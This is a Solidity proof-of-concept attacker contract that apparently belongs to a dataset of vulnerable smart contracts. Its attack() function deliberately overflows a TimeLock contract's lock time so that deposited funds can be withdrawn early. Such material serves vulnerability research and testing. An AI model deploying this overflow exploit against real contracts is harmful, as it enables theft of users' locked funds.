 pragma solidity ^0.4.10;

 import "../dataset/arithmetic/timelock.sol";
 
 contract TimeLockAttacker {
    TimeLock public target;

    constructor (address _targetAddress) public {
        target = TimeLock(_targetAddress);
    }

    function deposit() public payable {
        target.deposit.value(msg.value)();
    }

    function attack() public {

        uint256 timeLock = target.lockTime(address(this));
        uint256 overflowValue = 2**256 - 1 - timeLock + 1;
        target.increaseLockTime(overflowValue);

    }

    function withdraw() public {
        target.withdraw();
    }

    function() public payable {}
 }
